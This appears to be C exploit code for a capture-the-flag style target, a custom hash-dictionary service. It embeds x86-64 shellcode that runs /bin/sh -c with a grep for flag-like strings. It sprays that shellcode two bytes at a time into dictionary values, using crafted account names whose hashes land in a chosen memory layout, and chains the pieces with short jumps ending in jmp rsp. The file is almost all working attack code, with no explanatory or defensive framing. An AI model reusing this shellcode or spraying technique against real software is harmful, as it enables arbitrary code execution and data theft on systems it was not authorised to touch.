#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "dict/dict.h"

#include "sha256.h"

#define SC_SIZE 70


const unsigned char sc[SC_SIZE] =
{
    0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62,
    0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
    0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48,
    0x89, 0xe6, 0x52, 0xe8, 0x17, 0x00, 0x00, 0x00,
    0x67, 0x72, 0x65, 0x70, 0x20, 0x2d, 0x61, 0x6f,
    0x52, 0x50, 0x20, 0x27, 0x5c, 0x77, 0x7b, 0x33,
    0x31, 0x7d, 0x3d, 0x27, 0x20, 0x2e, 0x00, 0x56,
    0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05, 0x48, 0x31,
    0xff, 0x6a, 0x3c, 0x58, 0x0f, 0x05
};


/*
0x01000 - tree
0x71000 - code

dead000000

0x0100c - place to jump
0x71039 - jumping from
0x7002d - diff

0x70000 16384.0
*/

#define ACCOUNTS_TO_GEN (46)

unsigned char* accounts[ACCOUNTS_TO_GEN] = {0};
struct dict t;

int cmpfunc (const void * a, const void * b) {
    unsigned long h1 = get_hash(*(unsigned char**)a);
    unsigned long h2 = get_hash(*(unsigned char**)b);

    if(h1 < h2) {
        return -1;
    } else if(h1 > h2) {
        return 1;
    } else {
        return 0;
    }
}

unsigned char gap_lengths[] = {28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,28,
                   28,28,28,28,28,28,28,28,28,56,56,56,56,56,56,56,56,56,56,56,56,56,56};

unsigned long biggest_hash = 0;
// unsigned long smallest_hash = 0xffffffffffffffff;

void t_set(unsigned char* str, unsigned long value) {
    printf("t.set(\"%s\", %lu);\n", str, value);
    t.set(str, value);
}

void smart_set(unsigned char* str) {
    static int previous_offset = 0;
    static int set_num = 0;
    unsigned long hash = get_hash(str);

    unsigned char value[8];
    if(set_num == 0) {
        memcpy(value, "\xb3\xc0\x48\x89\xdc\x90\xeb\x00", 8);
    } else {
        memcpy(value, "\x66\xb8\xAA\xAA\x66\x50\xeb\x00", 8);

        int sc_offset = SC_SIZE - ((set_num - 1) * 2) - 2;
        // printf("%d\n", sc_offset);
        memcpy(&value[2], &sc[sc_offset], 2);

        if(sc_offset == -2) {
            value[0] = 0xff;
            value[1] = 0xe4;
        }
        if(sc_offset < -2) {
            return; // do nothing
        }
    }

    // last byte
    value[7] = gap_lengths[set_num] - 8; 
    // printf("%lx\n", *(unsigned long*) value);

    // t_set
    t_set(str, *(unsigned long*) value);
    set_num += 1;

    if(hash > biggest_hash) {
        biggest_hash = hash;
    }

    // for gap_lengths
    // int i = 0;
    // for(i = 0; i < 500000; i += 4) {
    //     unsigned long* cmp_with = (void *)0xdead000000 + i;
    //     if(*cmp_with == hash) {
    //         // printf("Founded at %d\n", i);

    //         if(previous_offset != 0) {
    //             // printf("%d,", i - previous_offset);
    //         }
    //         previous_offset = i;

    //         break;
    //     }
    //     // if((void *))
    // }


}

int main() {
    if(new_dict("test3", &t) == -1) {
        printf("Internal error\n");
        return 1;
    }

    int i;

    for(i = 0; i < ACCOUNTS_TO_GEN; i += 1) {
        unsigned char* account = malloc(64);
        sprintf(account, "bay_spl_1_%i", i);
        accounts[i] = account;
    }

    qsort(accounts, ACCOUNTS_TO_GEN, sizeof(unsigned char*), cmpfunc);

    // for(i = 0; i < ACCOUNTS_TO_GEN; i += 1) {
    //     printf("%s\t%lu\n", accounts[i], get_hash(accounts[i]));
    // }

    struct leftright {
        int left;
        int right;
    } lr_queue[10000];

    int queue_first = -1;
    int queue_last = 0;

    lr_queue[queue_last].left = 0;
    lr_queue[queue_last].right = ACCOUNTS_TO_GEN;
    queue_last += 1;

    while (queue_first != queue_last - 1) {
        queue_first += 1;
        int curr_left = lr_queue[queue_first].left;
        int curr_right = lr_queue[queue_first].right;

        if(curr_left >= curr_right) {
            continue;
        }
        // printf("left %d right %d\n", curr_left, curr_right);
        int curr_middle = curr_left + (curr_right - curr_left) / 2;

        // printf("putting %d\n", curr_middle);
        // printf("Adding: %lx %s\n", get_hash(accounts[curr_middle]), accounts[curr_middle]);

        smart_set(accounts[curr_middle]);

        lr_queue[queue_last].left = curr_left;
        lr_queue[queue_last].right = curr_middle;
        queue_last += 1;

        lr_queue[queue_last].left = curr_middle + 1;
        lr_queue[queue_last].right = curr_right;
        queue_last += 1;

        // printf("Queue last: %d\n", queue_last);
    }

    // -----

    // int found_index = 0;

    // for (i = 1000; found_index < ACCOUNTS_TO_GEN; i += 1) {
    //     unsigned char buf[128];

    //     sprintf(buf, "bay_spl_q_%i", i);

    //     if((unsigned long)get_hash(buf) < (unsigned long)get_hash("bay_spl_q_726639")
    //         && 
    //         (unsigned long)get_hash(buf) > (unsigned long)get_hash("bay_spl_q_893989")
    //         ) {
    //         if (((unsigned long)get_hash(buf) & 0xffff) != 0x1beb) {
    //             // printf("Bad %d %lx\n", i, (unsigned long)get_hash(buf) & 0xffff);
    //             continue;
    //         }

    //         strcpy(accounts[found_index], buf);
    //         printf("Found %s\n", buf);
    //         found_index += 1;
    //     }
    // }

    // qsort(accounts, ACCOUNTS_TO_GEN, sizeof(unsigned char*), cmpfunc);

    // // print list to paste
    // for(i = 0; i < ACCOUNTS_TO_GEN; i += 1) {
    //     printf("%s\t%lu\n", accounts[i], get_hash(accounts[i]));
    // }
/*
bay_spl_q_893989        187050584688732
bay_spl_q_2376807       192748570338524
bay_spl_q_3092641       193285352081387
bay_spl_q_2733232       200706584368575
bay_spl_q_1011399       202034945600394
bay_spl_q_2077357       206284593170570
bay_spl_q_1011682       216229608012277
bay_spl_q_3116649       217088359337116
bay_spl_q_2163908       225689724035530
bay_spl_q_665219        231004340264034
bay_spl_q_2892733       236250487579955
bay_spl_q_1825905       257173024679565
bay_spl_q_3165793       259847971967242
bay_spl_q_722395        262518545332442
bay_spl_q_894949        274311103929980


bay_spl_q_2282599       26429486851015264
bay_spl_q_2779990       26434133114263492
bay_spl_q_726639        26436306899461124
bay_spl_q_787388        26448231550135226
bay_spl_q_1267013       26450256037808539
bay_spl_q_330328        26461320550592746
bay_spl_q_1575586       26462466659891047
bay_spl_q_1228587       26463798637156813

bay_spl_q_809732        26467070354252476

*/
    // printf("get_hash %lx\n", get_hash("bay_spl_q_10629776"));

    t_set("bay_spl_q_809732", 1);
    t_set("bay_spl_q_1228587", 1);
    t_set("bay_spl_q_1575586", 1);
    t_set("bay_spl_q_330328", 1);
    t_set("bay_spl_q_1267013", 1);
    t_set("bay_spl_q_787388", 1);
    t_set("bay_spl_q_893989", 1);
    t_set("bay_spl_q_726639", 1);
    t_set("bay_spl_q_6244081", 0xfff8ffcee900);
    t_set("hack", 1);
    // t.set("bay_spl_1_4393406", 0xaaaaaaaaaaaaaaaa);
    // t.set("bay_spl_1_1874", 0xaaaaaaaa);
    // t.set("bay_spl_1_1148", 1);


    // for(i = 0; i < 500000; i += 4) {
    //     unsigned long* cmp_with = (void *)0xdead000000 + i;
    //     if(*cmp_with == get_hash("bay_spl_q_10629776")) {
    //         printf("Founded at %d\n", (i - 0x1000) / 28 );
    //         break;
    //     }
    // }



    // 16385
    // 8192
    // 4095
    // 2047
    // 1023
    // 511
    // 255
    // 127
    // 63 + 
    // 31
    // 15
    // 7
    // 3
    // 1
    // 0

    // asm("int $3;");

    return 0;
}
